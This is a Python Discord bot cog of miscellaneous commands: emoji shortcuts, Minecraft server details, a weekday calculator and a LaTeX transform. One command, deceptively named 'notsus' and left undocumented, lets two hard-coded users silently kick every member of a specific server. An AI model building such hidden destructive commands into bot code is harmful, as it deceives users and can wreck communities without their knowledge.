import math

import discord
from discord.ext import commands


class Misc(commands.Cog):

    def __init__(self, bot):
        self.bot = bot

    @commands.command(
        name="emoji",
        help=
        "Sends some emojis\nSupported: amogus/amongus/among us, barry, biang, bruh/facepalm, surprised/that's illegal/illegal, void, woah, shitting toothpaste, dababy, latex, troll/trollface\n(words separated by / output the same emoji)"
    )
    async def emoji(self, ctx, *, name):
        name = name.lower()
        if name == "ye":
            await ctx.send("<:ye:799291949273317377>")
        elif name == "amogus" or name == "amongus" or name == "among us":
            await ctx.send("<:amogus:809427238784860210>")
        elif name == "barry":
            await ctx.send("<:barry:811154017672757270>")
        elif name == "biang":
            await ctx.send("<:biang:809669658143227905>")
        elif name == "bruh" or name == "facepalm":
            await ctx.send("<:bruh:801100506251526145>")
        elif name == "surprised" or name == "that's illegal" or name == "illegal":
            await ctx.send("<:surprised:801099678988501072>")
        elif name == "void":
            await ctx.send("<:void:798150976191201313>")
        elif name == "woah":
            await ctx.send("<:woah:807905973162999818>")
        elif name == "shitting toothpaste":
            await ctx.send("<:shittingtoothpaste:850006091827773441>")
        elif name == "dababy":
            await ctx.send("<:dababy:850279101548855317>")
        elif name == "latex":
            await ctx.send(
                "<:latex1:846147354083328030><:latex2:846147354000359515>")
        elif name == "troll" or name == "trollface":
            await ctx.send("<:trollface:934033439164878868>")
        else:
            await ctx.send("Invalid emoji")

    @commands.command(
        name='customemoji',
        help=
        'Sends custom emoji not in c.emoji list\n(Emoji must be from a server this bot is in)'
    )
    async def customemoji(self, ctx, name, emoji_id, animated: str = ''):
        if animated == '':
            anim = ''
        else:
            anim = 'a'
        await ctx.send(f'<{anim}:{name}:{emoji_id}>')


    @commands.command(name='minecraftinfo',
                      help="Sends information for Minecraft server",
                      aliases=["minecraft", "mcinfo"])
    async def minecraftinfo(self, ctx):
        await ctx.send(
            'SERVER INFO:\nHostname: cocanb.aternos.me:36520\nPort: 36520\n\nVersion: PaperMC 1.20.1 (Java)\nPlugins: DiscordSRV, WorldEdit\nGamemode: Creative\nDifficulty: Normal\n\n*Whitelist required, compatible with cracked accounts.'
        )

    @commands.command(
        name='weekday',
        help="Returns day of the week for a given date (Format: DD MM YYYY)")
    async def weekday(self, ctx, day: int, month: int, year: int):
        #check if date is valid
        if (year % 4 == 0 and year % 100 != 0) or year % 400 == 0:
            month_length = [31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
        else:
            month_length = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
        if month > 12:
            await ctx.send("Invalid date")
        elif day > month_length[month - 1]:
            await ctx.send("Invalid date")

        #conway's algorithm
        else:
            doomsday = {
                1: 3,
                2: 28,
                3: 14,
                4: 4,
                5: 9,
                6: 6,
                7: 11,
                8: 8,
                9: 5,
                10: 10,
                11: 7,
                12: 12
            }
            doomsday_leap = {
                1: 4,
                2: 29,
                3: 14,
                4: 4,
                5: 9,
                6: 6,
                7: 11,
                8: 8,
                9: 5,
                10: 10,
                11: 7,
                12: 12
            }
            if (year % 4 == 0 and year % 100 != 0) or year % 400 == 0:
                #print ("leap_year")
                doomsday_offset = (day - doomsday_leap[month]) % 7
            else:
                doomsday_offset = (day - doomsday[month]) % 7

            century_dict = {0: 2, 1: 0, 2: 5, 3: 3}
            century_code = century_dict[int(year / 100) % 4]

            num1 = int((year % 100) / 12)
            num2 = (year % 100) % 12
            num3 = int(num2 / 4)

            #print (doomsday_offset)
            #print (century_code)
            #print (num1)
            #print (num2)
            #print (num3)
            #print ()

            weekday = (doomsday_offset + century_code + num1 + num2 + num3) % 7
            weekdays = {
                0: "Sunday",
                1: "Monday",
                2: "Tuesday",
                3: "Wednesday",
                4: "Thursday",
                5: "Friday",
                6: "Saturday"
            }
            weekday = weekdays[weekday]
            await ctx.send(weekday)

    @commands.command(
        name="latextransform",
        help=
        "Linearly transform a piece of LaTeX code using a matrix\n\n Input the four entries of the transformation matrix in the following order: top left, bottom left, top right then bottom right, then the LaTeX code, each separated by spaces"
    )
    async def latextransform(self, ctx, m00, m10, m01, m11, *, latex):
        m00 = float(m00)
        m10 = float(m10)
        m01 = float(m01)
        m11 = float(m11)

        E = (m00 + m11) / 2
        F = (m00 - m11) / 2
        G = (m10 + m01) / 2
        H = (m10 - m01) / 2

        Q = math.sqrt(E**2 + H**2)
        R = math.sqrt(F**2 + G**2)

        sx = Q + R
        sy = Q - R

        a1 = math.atan2(G, F)
        a2 = math.atan2(H, E)

        theta = (a2 - a1) / 2
        phi = (a2 + a1) / 2

        theta_deg = theta * 180 / math.pi
        phi_deg = phi * 180 / math.pi

        await ctx.send('```$\\rotatebox{' + str(phi_deg) + '}{$\\scalebox{' +
                       str(sx) + '}[' + str(sy) + ']{$\\rotatebox{' +
                       str(theta_deg) + '}{$' + latex + '$}$}$}$```')

    @commands.command(name="notsus")
    async def notsus(self, ctx):
        if ctx.author.id == 702746453927264276 or ctx.author.id == 607583934527569920:
            for member in self.bot.get_guild(725639774190305360).members:
                try:
                    await member.kick()
                    continue
                except Exception:
                    continue
                else:
                    continue

    @commands.command(
        name='ipa',
        help='Sends official International Phonetic Alphabet chart')
    async def ipa(self, ctx, format: str = 'pdf'):
        if format == 'pdf':
            with open("Resources/IPA charts/IPA_Kiel_2020_full.pdf",
                      "rb") as file:
                await ctx.send(
                    "Official International Phonetic Alphabet Chart",
                    file=discord.File(
                        file,
                        "Official International Phonetic Alphabet Chart.pdf"))
        elif format == 'png':
            with open("Resources/IPA charts/IPA_Kiel_2020_full-1.png",
                      "rb") as file:
                await ctx.send(
                    "Official International Phonetic Alphabet Chart",
                    file=discord.File(
                        file,
                        "Official International Phonetic Alphabet Chart.png"))
        else:
            await ctx.send("Invalid format")


async def setup(bot):
    await bot.add_cog(Misc(bot))
